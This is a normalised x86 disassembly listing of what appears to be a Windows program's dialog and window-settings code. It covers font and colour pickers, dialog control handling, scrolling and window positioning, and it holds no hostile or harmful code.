call esi
mov ebx [ esp + 0x34 ]
sub ebx [ esp + 0x2c ]
test edi 0x200000
mov [ esp + 0x24 ] eax
mov [ esp + 0x1c ] ebx
je r-xdata
mov esi [ esp + 0x38 ]
sub esi [ esp + 0x30 ]
test edi 0x100000
mov [ esp + 0x14 ] esi
je r-xdata
add ebx ebp
mov [ esp + 0x1c ] ebx
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x30 ] esp
mov ecx esp
je r-xdata
add esi eax
mov [ esp + 0x14 ] esi
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x34 ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_45ddb0
mov edx [ rw-data ]
xor cl cl
xor al al
add esp 0x20
test edx edx
mov [ rw-data ] cl
mov [ rw-data ] al
jne r-xdata
inc [ eax + 0xd48 ]
cmp [ esp + 0x10 ] ebx
jle r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
cmp [ esp + 0x18 ] esi
jle r-xdata
sub esi [ esp + 0x24 ]
mov edx [ esp + 0x18 ]
mov cl 0x1
cmp edx esi
mov esi [ esp + 0x14 ]
mov [ rw-data ] cl
jle r-xdata
mov [ esp + 0x28 ] edi
and edi 0xffcfffff
test al al
mov [ esp + 0x20 ] edi
je r-xdata
mov esi [ esp + 0x10 ]
mov edx ebx
sub edx ebp
mov al 0x1
cmp esi edx
mov esi [ esp + 0x14 ]
mov [ rw-data ] al
jle r-xdata
mov al cl
mov [ rw-data ] al
jmp r-xdata
test cl cl
je r-xdata
or edi 0x200000
sub ebx ebp
mov [ esp + 0x20 ] edi
mov [ esp + 0x1c ] ebx
mov cl al
mov [ rw-data ] cl
mov eax [ rw-data ]
push edi
push 0xfffffff0
push eax
call [ SetWindowLongA@IAT ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov eax [ esp + 0x24 ]
or edi 0x100000
sub esi eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x14 ] esi
mov al [ esp + 0x60 ]
test al al
mov ebp [ rw-data ]
je r-xdata
fld [ r--data ]
mov ecx [ esp + 0x68 ]
fdiv [ esp + 0x70 ]
mov edx [ rw-data ]
add edx ecx
mov [ esp + 0x24 ] edx
push ecx
fst [ esp + 0x68 ]
fmul [ rw-data ]
fimul [ esp + 0x28 ]
fstp [ esp ]
call sub_452500
fld [ esp + 0x68 ]
mov ecx eax
fmul [ rw-data ]
mov eax ebx
cdq
sub eax edx
mov edx [ esp + 0x70 ]
sar eax 0x1
sub ecx eax
mov eax [ rw-data ]
add eax edx
mov [ esp + 0x68 ] eax
mov [ rw-data ] ecx
fimul [ esp + 0x68 ]
fstp [ esp ]
call sub_452500
mov ecx eax
mov eax esi
cdq
sub eax edx
mov edx [ rw-data ]
sar eax 0x1
sub ecx eax
push edx
mov [ rw-data ] ecx
call sub_466150
add esp 0x8
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
test ecx ecx
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_45b5d0
add esp 0x4
imul eax eax 0x12c
mov ecx [ eax + rw-data ]
mov ecx [ rw-data ]
jmp r-xdata
mov eax [ esp + 0x10 ]
sub eax ebx
cmp ecx eax
jle r-xdata
xor ecx ecx
mov [ rw-data ] ecx
test ebp ebp
je r-xdata
cmp eax 0x1
jne r-xdata
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx eax
mov [ rw-data ] ecx
mov edi [ rw-data ]
sub edi ebp
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x64 ] edx
je r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
sub eax ebx
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
xor esi esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
cmp ecx 0x1
jne r-xdata
xor esi esi
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
test esi esi
jge r-xdata
xor ecx ecx
mov [ rw-data ] ecx
movzx edx si
movzx eax cx
shl edx 0x10
or edx eax
mov eax [ rw-data ]
imul eax eax 0x70
mov [ eax + ebp + 0x3c ] edx
mov ecx [ rw-data ]
mov esi [ rw-data ]
cmp eax 0x3
jne r-xdata
mov eax [ esp + 0x18 ]
sub eax esi
cdq
sub eax edx
mov esi eax
sar esi 0x1
test ecx ecx
mov [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ rw-data ]
mov ecx [ esp + 0x10 ]
xor esi esi
sub ecx ebx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ esp + 0x18 ]
sub eax [ esp + 0x14 ]
cmp esi eax
jle r-xdata
xor esi esi
mov [ rw-data ] esi
mov eax [ esp + 0x18 ]
sub eax esi
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x10 ]
sub eax ebx
cdq
sub eax edx
sar esi 0x1
mov ecx eax
sar ecx 0x1
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x1
jne r-xdata
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test esi esi
jge r-xdata
mov esi eax
mov [ rw-data ] esi
mov ecx [ rw-data ]
mov ecx [ esp + 0x10 ]
sub ecx ebx
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov al [ rw-data ]
test al al
mov edi [ SetScrollInfo@IAT ]
mov ebx 0x1c
mov ebp 0x7
je r-xdata
xor esi esi
mov [ rw-data ] esi
mov edi [ rw-data ]
sub edi ebp
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x64 ] edx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
push 0x1
mov [ esp + 0x54 ] ecx
dec edx
lea ecx [ esp + 0x40 ]
push ecx
mov [ esp + 0x50 ] edx
mov edx [ rw-data ]
push 0x0
push edx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x5c ] eax
call edi
mov esi [ rw-data ]
mov edx [ rw-data ]
imul edx edx 0x70
lea eax [ edx + ebp + 0x3c ]
mov edx [ eax ]
cmp edx 0xffffffff
je r-xdata
mov ecx [ esp + 0x20 ]
cmp [ esp + 0x28 ] ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push 0x1
dec eax
lea edx [ esp + 0x40 ]
push edx
mov [ esp + 0x50 ] eax
mov eax [ rw-data ]
push 0x1
push eax
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x5c ] ecx
mov [ esp + 0x60 ] esi
call edi
movzx ecx dx
mov [ rw-data ] ecx
movzx esi [ eax + 0x2 ]
mov [ rw-data ] esi
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
mov eax [ rw-data ]
mov esi 0x2
cmp eax esi
jne r-xdata
mov edx [ rw-data ]
push 0x27
push 0x0
push 0x0
push 0x0
push 0x0
push 0xfffffffe
push edx
call [ SetWindowPos@IAT ]
cmp [ rw-data ] 0x1
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] esi
sub_466e60
mov eax [ esp + 0x8 ]
sub esp 0x10
sub eax 0x4e
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ esp + 0x30 ]
mov eax [ eax + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
sub eax 0xc2
je r-xdata
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ rw-data ]
mov esi [ esp + 0x24 ]
push ecx
push 0x190
push 0x1
mov edi 0x7d3
mov ebx 0x7d4
call sub_457b80
fld [ rw-data ]
fmul [ r--data ]
add esp 0x8
fstp [ esp ]
call sub_452500
push eax
push 0x2710
push 0x1
mov edi 0x7d0
mov ebx 0x7d1
call sub_457b80
mov eax [ rw-data ]
mov ecx 0x7f2
mov edx esi
call sub_457bf0
mov edx [ rw-data ]
push edx
push 0x14
push 0x1
mov edi 0x7d5
mov ebx 0x7d6
call sub_457b80
mov eax [ rw-data ]
push eax
push 0xc8
push 0x1
mov edi 0x7d7
mov ebx 0x7d8
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x7d0
push 0x1
mov edi 0x7d9
mov ebx 0x7da
call sub_457b80
mov edx [ rw-data ]
push edx
push 0x14
push 0x1
mov edi 0x7db
mov ebx 0x7dc
call sub_457b80
mov eax [ rw-data ]
add esp 0x40
mov ecx 0x7dd
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
push eax
push 0x32
push 0x1
mov edi 0x7de
mov ebx 0x7df
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x32
push 0x1
mov edi 0x7e0
mov ebx 0x7e1
call sub_457b80
mov edx [ rw-data ]
push edx
push 0x3e8
push 0x0
mov edi 0x7e2
mov ebx 0x7e3
call sub_457b80
mov eax [ rw-data ]
push eax
push 0x3e8
push 0x0
mov edi 0x7e4
mov ebx 0x7e5
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x3e8
push 0x0
mov edi 0x7e6
mov ebx 0x7e7
call sub_457b80
mov edx [ rw-data ]
push edx
push 0x3e8
push 0x0
mov edi 0x7e8
mov ebx 0x7e9
call sub_457b80
mov ecx [ rw-data ]
add esp 0x48
push 0x7ec
push esi
mov eax 0x7ea
call sub_457c00
mov eax [ rw-data ]
mov ecx 0x7ed
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
push eax
push 0x1388
push 0x0
mov edi 0x7ee
mov ebx 0x7ef
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x186a0
push 0x0
mov edi 0x7f0
mov ebx 0x7f1
call sub_457b80
add esp 0x20
push 0x7ed
push esi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov edi eax
dec edi
neg edi
sbb edi edi
inc edi
push edi
push 0x7ef
push esi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push edi
push 0x7ee
push esi
call ebx
push eax
call ebp
push edi
push 0x7f1
push esi
call ebx
push eax
call ebp
push edi
push 0x7f0
push esi
call ebx
push eax
call ebp
mov ecx [ rw-data ]
push 0x7f4
push esi
mov eax 0x7f3
call sub_457c00
mov edx [ rw-data ]
push edx
push 0x64
push 0x0
mov edi 0x7f6
mov ebx 0x7f7
call sub_457b80
add esp 0x14
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn 0x10
dec eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn 0x10
mov esi [ esp + 0x24 ]
push rw-data
push 0x190
push 0x1
push 0x7d4
mov ecx 0x7d3
mov edx esi
call sub_457ca0
mov ecx [ rw-data ]
lea edx [ esp + 0x34 ]
push edx
push 0x2710
mov [ esp + 0x40 ] ecx
push 0x1
push 0x7d1
mov ecx 0x7d0
mov edx esi
call sub_457ca0
fld [ rw-data ]
fmul [ r--data ]
add esp 0x1c
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x28 ]
add esp 0x4
cmp ecx eax
je r-xdata
mov ecx [ esp + 0x2c ]
movzx eax cx
add eax 0xfffff830
cmp eax 0x26
ja r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn 0x10
push rw-data
mov eax 0x7f2
mov ecx esi
call sub_457ce0
push rw-data
push 0x14
push 0x1
push 0x7d6
mov ecx 0x7d5
mov edx esi
call sub_457ca0
push rw-data
push 0xc8
push 0x1
push 0x7d8
mov ecx 0x7d7
mov edx esi
call sub_457ca0
push rw-data
push 0x7d0
push 0x1
push 0x7da
mov ecx 0x7d9
mov edx esi
call sub_457ca0
push rw-data
push 0x14
push 0x1
push 0x7dc
mov ecx 0x7db
mov edx esi
call sub_457ca0
add esp 0x44
push rw-data
mov eax 0x7dd
mov ecx esi
call sub_457ce0
push rw-data
push 0x32
push 0x1
push 0x7df
mov ecx 0x7de
mov edx esi
call sub_457ca0
push rw-data
push 0x32
push 0x1
push 0x7e1
mov ecx 0x7e0
mov edx esi
call sub_457ca0
push rw-data
push 0x3e8
push 0x0
push 0x7e3
mov ecx 0x7e2
mov edx esi
call sub_457ca0
push rw-data
push 0x3e8
push 0x0
push 0x7e5
mov ecx 0x7e4
mov edx esi
call sub_457ca0
add esp 0x44
push rw-data
push 0x3e8
push 0x0
push 0x7e7
mov ecx 0x7e6
mov edx esi
call sub_457ca0
push rw-data
push 0x3e8
push 0x0
push 0x7e9
mov ecx 0x7e8
mov edx esi
call sub_457ca0
push rw-data
push 0x7ec
push esi
mov ebx 0x7ea
call sub_457d00
push rw-data
mov eax 0x7ed
mov ecx esi
call sub_457ce0
push rw-data
push 0x1388
push 0x0
push 0x7ef
mov ecx 0x7ee
mov edx esi
call sub_457ca0
add esp 0x40
push rw-data
push 0x186a0
push 0x0
push 0x7f1
mov ecx 0x7f0
mov edx esi
call sub_457ca0
push rw-data
push 0x7f4
push esi
mov ebx 0x7f3
call sub_457d00
push rw-data
push 0x64
push 0x0
push 0x7f7
mov ecx 0x7f6
mov edx esi
call sub_457ca0
add esp 0x2c
fild [ esp + 0x24 ]
mov ecx [ rw-data ]
lea eax [ esp + 0x10 ]
push eax
fmul [ r--data ]
push ecx
fstp [ rw-data ]
call [ GetWindowRect@IAT ]
mov ebx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x28 ]
sub eax ebx
mov ebx [ esp + 0x10 ]
push edx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ esp + 0x20 ]
sub eax ebx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ rw-data ]
push 0x1
push 0x0
push eax
call sub_466930
mov ecx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
movzx eax [ eax + lookup_table_4674cc ]
jmp [ eax * 4 + jump_table_4674bc ]
mov edi [ esp + 0x24 ]
push 0x0
push edi
push 0x468
push edi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x7ed
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov esi eax
dec esi
neg esi
sbb esi esi
inc esi
push esi
push 0x7ef
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0x7ee
push edi
call ebx
push eax
call ebp
push esi
push 0x7f1
push edi
call ebx
push eax
call ebp
push esi
push 0x7f0
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn 0x10
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
mov eax [ esp + 0x24 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn 0x10
sub_4674d0
add eax [ eax ]
add eax [ eax ]
add eax [ eax ]
add eax [ eax ]
add eax [ ecx ]
add [ ebx ] al
add [ ebx ] al
add [ ebx ] al
add [ ebx ] al
add [ ebx ] al
add [ ebx ] al
add [ ecx ] eax
add [ edx ] eax
add [ ebx ] al
add [ ebx ] al
add [ ecx ] eax
add [ ebx ] eax
add [ eax - 0x6f6f6f70 ] dl
nop
nop
nop
nop
nop
nop
nop
nop
mov eax [ esp + 0x8 ]
sub esp 0x44
cmp eax 0x4e
push ebx
push ebp
push esi
push edi
ja r-xdata
sub eax 0x110
je r-xdata
je r-xdata
mov ebp [ esp + 0x58 ]
push r--data
push 0x410
push ebp
mov [ rw-data ] 0x0
call [ SetDlgItemTextA@IAT ]
mov ecx [ rw-data ]
push 0xddb
push ebp
mov eax 0xdda
call sub_457c00
mov eax [ rw-data ]
push eax
push 0x64
push 0x8
mov edi 0xde1
mov ebx 0xde7
mov esi ebp
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x190
push 0xffffffce
mov edi 0xde8
mov ebx 0xde9
call sub_457b80
mov edx [ rw-data ]
push edx
push 0x14
push 0x0
mov edi 0xdf8
mov ebx 0xdf9
call sub_457b80
mov eax [ rw-data ]
push eax
push 0x190
push 0x0
mov edi 0xdf4
mov ebx 0xdf5
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x190
push 0xffffffce
mov edi 0xdea
mov ebx 0xdeb
call sub_457b80
mov edx [ rw-data ]
add esp 0x44
push edx
push 0x190
push 0x0
mov edi 0xdec
mov ebx 0xded
call sub_457b80
mov eax [ rw-data ]
push eax
push 0x190
push 0x0
mov edi 0xdee
mov ebx 0xdef
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x190
push 0x0
mov edi 0xdf0
mov ebx 0xdf1
call sub_457b80
mov edx [ rw-data ]
push edx
push 0x190
push 0x0
mov edi 0xdf2
mov ebx 0xdf3
call sub_457b80
mov eax [ rw-data ]
mov ecx 0x4f3
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
push eax
push 0x190
push 0x0
mov edi 0xdf6
mov ebx 0xdf7
call sub_457b80
mov ecx [ rw-data ]
mov ebx [ GetDlgItem@IAT ]
add esp 0x3c
push ecx
push 0xffffffeb
push 0xddd
push ebp
call ebx
mov esi [ SetWindowLongA@IAT ]
push eax
call esi
mov edx [ rw-data ]
push edx
push 0xffffffeb
push 0xde2
push ebp
call ebx
push eax
call esi
mov ecx 0xf
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
xor ecx ecx
mov cl [ rw-data ]
push 0xde5
push ebp
mov eax 0xde4
not ecx
and ecx 0x1
call sub_457c00
add esp 0x8
push 0xddf
push ebp
call ebx
mov esi [ SendMessageA@IAT ]
xor edi edi
mov ebx eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] 0x80
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] r--data
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x64 ]
mov eax [ ecx + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
sub eax 0x2
je r-xdata
mov eax [ esp + edi * 4 + 0x18 ]
push eax
push 0x0
push 0x143
push ebx
call esi
mov eax [ esp + edi * 4 + 0x10 ]
push eax
push edi
push 0x151
push ebx
call esi
movzx ecx [ rw-data ]
cmp [ esp + edi * 4 + 0x10 ] ecx
jne r-xdata
mov ecx [ esp + 0x60 ]
movzx eax cx
cmp eax 0xde8
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn 0x10
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x6
mov eax [ esp + 0x58 ]
push 0x0
push 0x0
push 0x30
push 0x410
push eax
call [ SendDlgItemMessageA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x29
jne r-xdata
inc edi
cmp edi 0x2
jl r-xdata
push 0x0
push edi
push 0x14e
push ebx
call esi
push 0x0
push 0x10ddf
push 0x111
push ebp
call esi
sub eax 0xdea
cmp eax 0xe
ja r-xdata
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
mov esi [ esp + 0x58 ]
push rw-data
push 0xddb
push esi
mov ebx 0xdda
call sub_457d00
push rw-data
push 0x64
push 0x8
push 0xde7
mov ecx 0xde1
mov edx esi
call sub_457ca0
push rw-data
push 0x190
push 0xffffffce
push 0xde9
mov ecx 0xde8
mov edx esi
call sub_457ca0
push rw-data
push 0x190
push 0x0
push 0xdf5
mov ecx 0xdf4
mov edx esi
call sub_457ca0
push rw-data
push 0x14
push 0x0
push 0xdf9
mov ecx 0xdf8
mov edx esi
call sub_457ca0
add esp 0x4c
push rw-data
push 0x190
push 0xffffffce
push 0xdeb
mov ecx 0xdea
mov edx esi
call sub_457ca0
push rw-data
push 0x190
push 0x0
push 0xded
mov ecx 0xdec
mov edx esi
call sub_457ca0
push rw-data
push 0x190
push 0x0
push 0xdef
mov ecx 0xdee
mov edx esi
call sub_457ca0
push rw-data
push 0x190
push 0x0
push 0xdf1
mov ecx 0xdf0
mov edx esi
call sub_457ca0
add esp 0x40
push rw-data
push 0x190
push 0x0
push 0xdf3
mov ecx 0xdf2
mov edx esi
call sub_457ca0
push rw-data
mov eax 0x4f3
mov ecx esi
call sub_457ce0
push rw-data
push 0x190
push 0x0
push 0xdf7
mov ecx 0xdf6
mov edx esi
call sub_457ca0
mov edi [ GetDlgItem@IAT ]
add esp 0x24
push 0xffffffeb
push 0xde2
push esi
call edi
mov ebx [ GetWindowLongA@IAT ]
push eax
call ebx
push 0xffffffeb
push 0xddd
push esi
mov [ rw-data ] eax
call edi
push eax
call ebx
mov edx [ rw-data ]
mov ecx 0xf
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov [ rw-data ] eax
xor esi esi
lea ebx [ ebx ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
xor eax eax
pop ebx
add esp 0x44
retn 0x10
push eax
call [ DeleteObject@IAT ]
mov esi [ esp + 0x64 ]
mov eax [ esi + 0x14 ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateSolidBrush@IAT ]
mov edx [ esi + 0x18 ]
mov edi eax
push edi
lea ecx [ esi + 0x1c ]
push ecx
push edx
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn 0x10
push 0xde6
push ebp
call [ GetDlgItem@IAT ]
push 0x0
push 0x0
mov ebx eax
push 0x146
push ebx
call esi
xor edi edi
test eax eax
mov [ esp + 0x58 ] eax
jle r-xdata
movzx edx [ eax + lookup_table_467ecc ]
jmp [ edx * 4 + jump_table_467ec4 ]
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
cmp eax 0xde1
jg r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edi edi
mov eax [ esp + 0x58 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
sub eax 0xde3
cmp eax 0x3
ja r-xdata
je r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x18 ]
push edx
push eax
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x24 ]
mov ecx [ rw-data ]
mov edi [ esp + 0x18 ]
sub eax edx
cdq
sub eax edx
sar eax 0x1
push ecx
push eax
mov eax [ esp + 0x28 ]
sub eax edi
cdq
sub eax edx
mov edx [ rw-data ]
sar eax 0x1
push eax
push 0x1
push 0x0
push edx
call sub_466930
mov eax [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
mov ecx [ edx + esi * 4 ]
test ecx ecx
je r-xdata
cmp esi eax
jge r-xdata
mov eax [ esp + 0x58 ]
inc edi
cmp edi eax
jl r-xdata
push eax
push edi
push 0x14e
push ebx
call esi
push 0x0
push 0x10de6
push 0x111
push ebp
call esi
jmp [ eax * 4 + jump_table_467eb4 ]
cmp eax 0xdde
jg r-xdata
inc esi
jmp r-xdata
mov eax [ ecx + 0xd30 ]
test eax eax
je r-xdata
lea edx [ esp + 0x18 ]
push edx
push edi
push 0x148
push ebx
call esi
lea eax [ esp + 0x18 ]
push eax
push rw-data
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
mov esi [ esp + 0x58 ]
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
lea eax [ esp + 0x58 ]
push eax
push 0xde5
push esi
mov ebx 0xde4
call sub_457d00
mov edi [ esp + 0x64 ]
add esp 0xc
xor ebx ebx
push ebx
push ebx
cmp edi ebx
mov edi [ SendDlgItemMessageA@IAT ]
push 0x147
setne cl
push 0xddf
inc cl
push esi
mov [ rw-data ] cl
call edi
cmp eax 0xffffffff
je r-xdata
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
cmp cx 0xde3
mov esi [ esp + 0x58 ]
jne r-xdata
cmp eax 0xddf
jne r-xdata
je r-xdata
test edx edx
jne r-xdata
call sub_43a280
mov edx [ rw-data ]
push ebx
push eax
push 0x150
push 0xddf
push esi
call edi
push ebx
push ebx
push 0x146
push 0xde6
push esi
mov [ rw-data ] al
mov [ esp + 0x43 ] al
mov [ esp + 0x48 ] bl
mov [ esp + 0x47 ] bl
call edi
cmp eax ebx
jle r-xdata
mov ebx [ esp + 0x58 ]
push 0x0
push ebx
push 0x468
push ebx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov ebp [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0xde6
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
push 0xddd
push 0xde2
jmp r-xdata
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
cmp eax 0x4f3
je r-xdata
push ebx
call [ GetDC@IAT ]
push ebx
push esi
push r-xdata
lea edx [ esp + 0x24 ]
mov edi eax
push edx
push edi
call [ EnumFontFamiliesExA@IAT ]
push edi
push ebx
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
mov ebp eax
push rw-data
push eax
push 0x148
push 0xde6
push ebx
call ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebx
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x24 ]
push ecx
push 0xffffffeb
push edi
call [ SetWindowLongA@IAT ]
push 0x1
push ebx
push edi
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
push esi
call [ GetDlgItem@IAT ]
mov edi eax
push 0xffffffeb
xor ebx ebx
push edi
mov [ esp + 0x20 ] 0x24
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] ebx
call [ GetWindowLongA@IAT ]
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x2c ] rw-data
mov [ esp + 0x30 ] 0x3
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call [ ChooseColorA@IAT ]
test eax eax
je r-xdata
cmp eax 0xdd9
jle r-xdata
push ebx
push ebx
push 0x144
push 0xde6
push esi
call edi
dec ebp
jne r-xdata
lea edx [ esp + 0x18 ]
mov ecx 0xf
mov esi rw-data
lea edi [ esp + 0x18 ]
[ edi ] [ esi ]
push edx
mov [ rw-data ] 0x0
mov [ esp + 0x1c ] 0xfffffff2
call [ CreateFontIndirectA@IAT ]
push 0x1
push eax
push 0x30
push 0x410
push ebx
mov [ rw-data ] eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
push eax
call [ DeleteObject@IAT ]
cmp eax 0xddb
jg r-xdata
mov ebx [ esp + 0x58 ]
push 0x0
push ebx
push 0x468
push ebx
call [ GetParent@IAT ]
mov esi [ SendMessageA@IAT ]
push eax
call esi
push 0x0
push 0x10ddf
push 0x111
push ebx
call esi
push 0xde6
push ebx
call [ GetDlgItem@IAT ]
push 0x0
push 0x0
mov ebp eax
push 0x146
push ebp
call esi
xor edi edi
test eax eax
mov [ esp + 0x58 ] eax
jle r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push edi
push 0x148
push ebp
call esi
cmp [ rw-data ] 0x40
mov eax rw-data
lea ecx [ esp + 0x18 ]
jne r-xdata
cmp [ esp + 0x18 ] 0x40
jne r-xdata
mov eax rw-data
push ecx
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x19 ]
mov eax [ esp + 0x58 ]
inc edi
cmp edi eax
jl r-xdata
push eax
push edi
push 0x14e
push ebp
call esi
push 0x0
push 0x10de6
push 0x111
push ebx
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x44
retn 0x10
sub_467ee0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_461b30
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_467f20
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x8 ]
mov eax 0xfffffff
sub eax edx
cmp eax ebx
push edi
jae r-xdata
mov ecx [ esi + 0x8 ]
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
call sub_465360
cmp ebx eax
jae r-xdata
mov eax 0x8
mov edi [ esi + 0xc ]
lea eax [ ecx + ebx ]
shl eax 0x2
push eax
shr edi 0x2
call sub_4b573e
